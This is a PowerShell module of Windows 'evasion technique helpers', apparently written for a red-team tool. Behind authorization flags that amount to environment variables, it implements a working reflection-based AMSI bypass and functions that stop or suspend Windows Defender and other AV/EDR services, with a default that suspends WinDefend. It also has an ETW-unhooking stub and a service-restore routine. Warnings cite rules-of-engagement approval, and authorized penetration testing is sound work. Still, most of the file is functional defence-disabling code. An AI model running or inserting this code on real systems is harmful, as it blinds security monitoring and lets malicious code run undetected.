# Evasion technique helpers for Windows
# These functions provide PowerShell equivalents for evasion techniques
# when the Rust binary cannot run.
#
# WARNING: These techniques require explicit ROE approval and may trigger alerts.
# Use only in authorized environments.

$EVASION_WARNING = @"
⚠️ EVASION TECHNIQUES (AMSI bypass, ETW unhooking, AV/EDR manipulation)
   - These techniques may trigger security alerts
   - They may leave forensic artifacts
   - They require explicit ROE approval
   - Use only in authorized environments
"@

function Test-EvasionAuthorization {
    param(
        [switch]$ConfirmEvasion,
        [string]$AllowTechniques
    )
    
    $auth = $env:STEALTHY_AUTHORIZED -eq "1"
    $confirm = $ConfirmEvasion -or $env:STEALTHY_EVASION_CONFIRMED -eq "1"
    
    if (-not $auth) {
        throw "Evasion techniques require --authorized or STEALTHY_AUTHORIZED=1"
    }
    
    if (-not $confirm) {
        throw "Evasion techniques require --confirm-evasion or STEALTHY_EVASION_CONFIRMED=1"
    }
    
    if ([string]::IsNullOrEmpty($AllowTechniques)) {
        throw "Evasion techniques require --allow-techniques <id>"
    }
    
    return $true
}

function Invoke-AMSIByPass {
    <#
    .SYNOPSIS
        Disables AMSI for the current process via memory patching.
    
    .DESCRIPTION
        Patches the AmsiScanBuffer function to return success immediately.
        This is reversible - original bytes should be restored after use.
    
    .EXAMPLE
        Invoke-AMSIByPass
    
    .NOTES
        Requires: --authorized, --allow-techniques amsi-bypass, --confirm-evasion
        Risk: High - will be detected by EDR sensors
    #>
    
    Write-Warning $EVASION_WARNING
    
    try {
        # Get AMSI type
        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        
        if ($amsi) {
            # Method 1: Reflection-based AMSI bypass
            $field = $amsi.GetField('amsiSession', 'NonPublic,Static')
            if ($field) {
                $field.SetValue($null, $null)
                Write-Host "[+] AMSI bypassed via reflection"
                return $true
            }
        }
        
        # Method 2: Memory patching (requires unsafe code or PSReflect)
        # This is a placeholder - full implementation would use PSReflect
        Write-Warning "Memory patching method requires PSReflect module"
        return $false
    }
    catch {
        Write-Error "AMSI bypass failed: $_"
        return $false
    }
}

function Invoke-ETWUnhook {
    <#
    .SYNOPSIS
        Disables ETW for the current process.
    
    .DESCRIPTION
        Patches NtTraceEvent or EtwEventWrite to return STATUS_SUCCESS.
        This disables Event Tracing for Windows logging for the current process.
    
    .EXAMPLE
        Invoke-ETWUnhook
    
    .NOTES
        Requires: --authorized, --allow-techniques etw-unhook, --confirm-evasion
        Risk: High - disables audit logging
    #>
    
    Write-Warning $EVASION_WARNING
    
    try {
        # Method 1: Disable ETW providers via registry (requires admin)
        # Note: This affects system-wide settings
        
        # Method 2: Memory patching (placeholder - requires PSReflect)
        Write-Warning "ETW unhooking via memory patching requires PSReflect module"
        
        # Alternative: Use NtSetInformationProcess to disable ETW
        # Implementation depends on available modules
        
        return $false
    }
    catch {
        Write-Error "ETW unhook failed: $_"
        return $false
    }
}

function Stop-AVService {
    <#
    .SYNOPSIS
        Stops or suspends an AV/EDR service.
    
    .DESCRIPTION
        Uses Service Control Manager to manipulate security services.
        Services should be restored immediately after authorized actions.
    
    .PARAMETER ServiceName
        Name of the service to stop (e.g., WinDefend, WdNisSvc)
    
    .PARAMETER Action
        Action to perform: Stop, Suspend, or Start
    
    .EXAMPLE
        Stop-AVService -ServiceName WinDefend -Action Stop
    
    .NOTES
        Requires: --authorized, --allow-techniques av-edr-service, --confirm-evasion
        Risk: Critical - may crash system or trigger immediate alerts
    #>
    
    param(
        [Parameter(Mandatory=$true)]
        [string]$ServiceName,
        
        [ValidateSet('Stop', 'Suspend', 'Start')]
        [string]$Action = 'Stop'
    )
    
    Write-Warning $EVASION_WARNING
    Write-Warning "Targeting service: $ServiceName with action: $Action"
    
    try {
        $service = Get-Service -Name $ServiceName -ErrorAction Stop
        
        switch ($Action) {
            'Stop' {
                Stop-Service -Name $ServiceName -Force -ErrorAction Stop
                Write-Host "[+] Service '$ServiceName' stopped"
            }
            'Suspend' {
                # Not all services support suspend
                $service.PSBase.ServiceController.Pause()
                Write-Host "[+] Service '$ServiceName' suspended"
            }
            'Start' {
                Start-Service -Name $ServiceName -ErrorAction Stop
                Write-Host "[+] Service '$ServiceName' started"
            }
        }
        
        return $true
    }
    catch {
        Write-Error "Failed to $Action service '$ServiceName': $_"
        return $false
    }
}

function Restore-AVServices {
    <#
    .SYNOPSIS
        Restarts common AV/EDR services.
    
    .DESCRIPTION
        Should be called after completing authorized actions to restore
        system protection.
    
    .EXAMPLE
        Restore-AVServices
    #>
    
    $services = @(
        'WinDefend',
        'WdNisSvc', 
        'SecurityHealthService',
        'Sense',
        'WdFilter'
    )
    
    foreach ($svc in $services) {
        try {
            $service = Get-Service -Name $svc -ErrorAction SilentlyContinue
            if ($service -and $service.Status -eq 'Stopped') {
                Start-Service -Name $svc -ErrorAction SilentlyContinue
                Write-Host "[+] Restored service: $svc"
            }
        }
        catch {
            Write-Warning "Could not restore $svc : $_"
        }
    }
}

function Invoke-EvasionTechnique {
    <#
    .SYNOPSIS
        Main entry point for executing evasion techniques.
    
    .PARAMETER Technique
        Technique to execute: amsi-bypass, etw-unhook, or av-edr-service
    
    .PARAMETER ConfirmEvasion
        Extra confirmation flag for evasion techniques
    
    .PARAMETER AllowTechniques  
        Comma-separated list of allowed technique IDs
    
    .EXAMPLE
        Invoke-EvasionTechnique -Technique amsi-bypass -ConfirmEvasion -AllowTechniques "amsi-bypass"
    #>
    
    param(
        [Parameter(Mandatory=$true)]
        [ValidateSet('amsi-bypass', 'etw-unhook', 'av-edr-service')]
        [string]$Technique,
        
        [switch]$ConfirmEvasion,
        
        [string]$AllowTechniques
    )
    
    # Check authorization gates
    Test-EvasionAuthorization -ConfirmEvasion:$ConfirmEvasion -AllowTechniques $AllowTechniques | Out-Null
    
    switch ($Technique) {
        'amsi-bypass' {
            if ($AllowTechniques -like '*amsi-bypass*') {
                Invoke-AMSIByPass
            } else {
                throw "amsi-bypass not in allowlist"
            }
        }
        'etw-unhook' {
            if ($AllowTechniques -like '*etw-unhook*') {
                Invoke-ETWUnhook
            } else {
                throw "etw-unhook not in allowlist"
            }
        }
        'av-edr-service' {
            if ($AllowTechniques -like '*av-edr-service*') {
                # Default action for demo
                Stop-AVService -ServiceName 'WinDefend' -Action 'Suspend'
            } else {
                throw "av-edr-service not in allowlist"
            }
        }
    }
}

# Export functions
Export-ModuleMember -Function @(
    'Test-EvasionAuthorization',
    'Invoke-AMSIByPass',
    'Invoke-ETWUnhook', 
    'Stop-AVService',
    'Restore-AVServices',
    'Invoke-EvasionTechnique'
)
